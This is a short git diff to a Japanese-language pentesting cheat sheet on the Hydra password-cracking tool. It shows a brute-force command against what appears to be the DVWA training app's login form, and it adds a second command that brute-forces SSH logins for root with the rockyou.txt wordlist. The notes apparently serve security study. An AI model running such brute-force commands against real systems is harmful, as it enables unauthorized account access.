@@ -9,6 +9,11 @@
       hydra 192.168.XXX.XXX -s 80 -l gordonb -P /usr/share/wordlists/metasploit/burnett_top1024.txt http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=セッションID;security=low:F=Username and/or password incorrect."
   ```
 
+  ``` shell
+      # sshでrockyou.txtを使ったパスワード総当たり
+      hydra -l root -P rockyou.txt XXX.YYY.ZZZ.III ssh
+  ```
+
 | command                                                  | summary                                     |
 | -------------------------------------------------------- | ------------------------------------------- |
 | Hydra                                                    | hydraコマンド                               |
